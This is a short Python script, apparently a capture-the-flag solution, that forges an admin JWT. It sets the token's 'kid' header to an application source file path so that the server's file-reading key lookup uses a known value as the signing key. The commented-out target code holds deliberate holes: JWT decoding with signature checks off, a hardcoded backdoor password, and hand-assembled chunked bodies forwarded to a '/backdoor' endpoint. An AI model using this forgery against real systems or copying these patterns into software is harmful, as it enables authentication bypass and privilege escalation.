import jwt


kid = "frontend/src/app.py"

def login():
    user_info = {"username": "abc", "isadmin": True}
    key = get_key(kid)
    token = jwt.encode(user_info, key, algorithm="HS256", headers={"kid": kid})
    return token

# def admin():
#     token = request.cookies.get('token')
#     if token and verify_token(token):
#         if request.method == 'POST':
#             if jwt.decode(token, algorithms=['HS256'], options={"verify_signature": False})['isadmin']:
#                 forward_url = "python-backend:8080"
#                 conn = http.client.HTTPConnection(forward_url)
#                 method = request.method
#                 headers = {key: value for (key, value) in request.headers if key != 'Host'}
#                 data = request.data
#                 path = "/"
#                 if request.query_string:
#                     path += "?" + request.query_string.decode()
#                 if headers.get("Transfer-Encoding", "").lower() == "chunked":
#                     data = "{}\r\n{}\r\n0\r\n\r\n".format(hex(len(data))[2:], data.decode())
#                 if "BackdoorPasswordOnlyForAdmin" not in data:
#                     return "You are not an admin!"
#                 conn.request(method, "/backdoor", body=data, headers=headers)
#                 return "Done!"
#             else:
#                 return "You are not an admin!"
#         else:
#             if jwt.decode(token, algorithms=['HS256'], options={"verify_signature": False})['isadmin']:
#                 return "Welcome admin!"
#             else:
#                 return "You are not an admin!"
#     else: 
#         return redirect("/login", code=302)

def get_key(kid):
    key = ""
    dir = "/app/"
    try:
        with open(dir+kid, "r") as f:
            key = f.read()
    except:
        pass
    print(key)
    return key

def verify_token(token):
    header = jwt.get_unverified_header(token)
    kid = header["kid"]
    key = get_key(kid)
    try:
        payload = jwt.decode(token, key, algorithms=["HS256"])
        return True
    except:
        return False
